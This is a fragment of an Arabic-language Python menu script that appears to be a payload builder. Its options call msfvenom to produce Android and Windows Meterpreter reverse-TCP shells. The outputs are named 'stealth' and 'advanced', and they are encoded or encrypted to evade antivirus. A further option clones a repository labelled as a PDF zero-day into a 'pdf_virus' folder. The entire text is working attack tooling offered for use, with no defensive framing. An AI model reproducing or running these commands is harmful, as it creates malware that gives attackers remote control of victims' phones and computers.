    choice = input(Fore.MAGENTA + "\n👉 الاختيار: " + Style.RESET_ALL)
    
    if choice == "1":
        lhost = input(Fore.CYAN + "\n🎯 أدخل IP جهازك: " + Style.RESET_ALL)
        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT=4444 -o output/android_stealth.apk --encoder x86/shikata_ga_nai -i 10")
        print(Fore.GREEN + "\n✅ تم الإنشاء: output/android_stealth.apk" + Style.RESET_ALL)
    elif choice == "2":
        lhost = input(Fore.CYAN + "\n🎯 أدخل IP جهازك: " + Style.RESET_ALL)
        os.system(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT=5555 -f exe -o output/windows_advanced.exe --encrypt rc4")
        print(Fore.GREEN + "\n✅ تم الإنشاء: output/windows_advanced.exe" + Style.RESET_ALL)
    elif choice == "3":
        os.system("git clone https://github.com/abn_adlepx/pdf_zero_day.git modules/pdf_virus")
